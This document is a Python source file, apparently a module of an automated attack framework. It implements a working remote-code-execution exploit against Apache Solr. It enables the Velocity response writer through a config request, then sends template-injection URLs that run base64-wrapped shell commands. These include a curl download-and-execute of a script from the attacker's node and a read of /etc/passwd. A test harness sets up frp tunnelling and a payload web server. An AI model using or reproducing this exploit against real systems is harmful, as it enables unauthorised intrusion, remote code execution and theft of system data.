import base64
import os
import sys
import tempfile
import time
from typing import TYPE_CHECKING
from urllib.parse import quote

import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils import Exploiter

if TYPE_CHECKING:
    from main import ControledNode, LocalNode


def random_str():
    return next(tempfile._get_candidate_names())


class SolrExploiter(Exploiter):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.prefix = f"http://{self.ip}:8983"
        self.is_rce = True
        self.is_endpoint = True

    def encode_cmd(self, cmd: str) -> str:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        return f"echo {cmd_b64} | base64 -d | /bin/bash"

    def exploit_rce_init(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        proxier.send_request(
            "post",
            f"{self.prefix}/solr/demo/config",
            json={
                "update-queryresponsewriter": {
                    "startup": "lazy",
                    "name": "velocity",
                    "class": "solr.VelocityResponseWriter",
                    "template.base.dir": "",
                    "solr.resource.loader.enabled": "true",
                    "params.resource.loader.enabled": "true",
                }
            },
        )

    def exploit_rce(
        self, proxier: "ControledNode | LocalNode | LocalNodeFake", cmd
    ) -> str:
        encoded_cmd = self.encode_cmd(cmd)

        malicious_shell = random_str()
        with open(f"/tmp/{malicious_shell}", "w") as f:
            f.write(encoded_cmd)

        cmd1 = f"curl -o /tmp/{malicious_shell} http://{proxier.init_node_ip}:{proxier.init_node_port}/{malicious_shell}"

        cmd2 = f"/bin/bash /tmp/{malicious_shell}"

        path1 = f"{self.prefix}/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd1}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

        path2 = f"{self.prefix}/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd2}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
        }

        proxier.send_request(
            "get",
            path1,
            headers=headers,
        )

        res = proxier.send_request(
            "get",
            path2,
            headers=headers,
        )

        return res.text

    def exploit_no_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        cmd = "cat /etc/passwd"
        res = self.exploit_rce(proxier, cmd)
        print(res)


if __name__ == "__main__":

    class LocalNodeFake:
        def __init__(self):
            self.ip = "192.168.123.110"
            self.session = requests.Session()
            self.web_server_port = 20001
            self.init_node_ip = self.ip
            self.init_node_port = self.web_server_port
            self.build_web_server()

        def build_web_server(self):
            self.upload_file("./frp.tar.gz", "frp.tar.gz")
            self.upload_file("./httpd", "httpd")
            self.execute_rce("tar -xzvf /tmp/frp.tar.gz -C /tmp/")
            self.execute_rce(f"chmod +x /tmp/httpd")
            self.execute_rce(
                f"/tmp/httpd /tmp --port {self.web_server_port} --daemon",
            )

        def execute_rce(self, cmd: str):
            os.system(cmd)

        def upload_file(self, attack_file_path: str, file_name: str):
            self.execute_rce(f"cp -f {attack_file_path} /tmp/{file_name}")

        def map_to_attacker(self, port: int):
            # do nothing
            pass

        def send_request(self, method: str, *argvs, **argv):
            if method.upper() == "GET":
                return self.session.get(*argvs, **argv)
            elif method.upper() == "POST":
                return self.session.post(*argvs, **argv)
            else:
                raise Exception("Method not supported")

    local_node_fake = LocalNodeFake()
    exploiter = SolrExploiter("192.168.123.53")
    exploiter.exploit_rce_init(local_node_fake)
    exploiter.exploit_rce(local_node_fake, "touch /tmp/success")
    exploiter.exploit_no_rce(local_node_fake)
